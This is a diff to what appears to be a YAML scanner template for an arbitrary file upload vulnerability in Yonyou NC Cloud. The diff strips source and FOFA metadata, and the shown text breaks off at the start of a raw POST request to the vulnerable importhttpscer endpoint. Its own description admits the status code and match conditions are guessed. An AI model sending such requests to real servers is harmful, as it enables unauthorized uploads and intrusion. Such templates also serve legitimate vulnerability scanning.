@@ -3,14 +3,8 @@ info:
   name: 用友NCcloudimporthttpscer存在任意文件上传
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/911b14252ff3462c1e1acaf09783a1e0
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 911b14252ff3462c1e1acaf09783a1e0
-    fofa: + fofa`app="用友-NC-Cloud"`
 http:
 - raw:
   - 'POST /nccloud/mob/pfxx/manualload/importhttpscer HTTP/1.1
